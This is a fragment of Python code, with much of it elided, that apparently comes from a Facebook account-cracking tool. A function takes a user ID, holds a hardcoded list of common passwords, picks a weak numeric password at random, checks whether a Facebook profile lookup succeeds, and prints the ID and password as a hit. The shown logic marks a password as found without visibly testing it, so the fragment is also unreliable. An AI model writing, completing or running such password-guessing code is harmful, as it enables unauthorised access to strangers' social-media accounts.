...
def getname(uid):
    ...
    passlist = ["Augustus","automobile","awdqseawdssa","azsxdcfvgbhn","bababooey","57575751","57273200","1234567","banana123","barbariska","bassmaster","bdsmbdsm","beefstew","beefheart","beccaboo","bebemi27","beatles2","BEATLES","Bears1","bearboy","beamer1","beal@es","beabea","bdusty","gizmodom","gizmodog","girlpower","ginawild","gin55ger","gianfranco","giacomin","ghjrkznsq","ghjgtkkth","ghjghj22","ghjcnjdkfl","ghjcnbnewbz","ghj100","ghfrnbrf","ghfgjhobr","ghbywtcc","ghblehjr1","ghbjhf","ghbdtncerf","agottogo","gotahack","gossipgirl","goreds","Gordon1","goracing","gopens","googlecheckou","goofie","goodpass","goodnite","goodboy1","goodbo","good12","good11","gonzoo","gonzo2","gondon","golubev","golosa","golfer22","mecanic","mebaby","me262a","me123456","mdmzyxel","mdmusrk1","mdmtdkj7","mdmsun2","mdmrock","mdmnttp","mdmgl006","mdmgl005","mdmgl002","mdmcpq2","mdmboca","mdmaiwa5","mdmaiwa4","mcnasty","mccord","mcclane","mccarty","mbrown","Mazda626","mazda323","mazda2","mazafaker","mayer","maybelle","maybach","maxxim","maxogo","maxivan","max666","mawmaw","24121995","24121978","241187","241185","24101975","240983","240687","240681","24061973"]
    samsungx = random.choice(['123456789','123456','12345678','1234567'])
    ...
    if "Content not found" not in name and "Log in to Facebook" not in name:
        ...
        print(f"\033[1;92m[XIVE-OK] {uid} | {samsungx}")
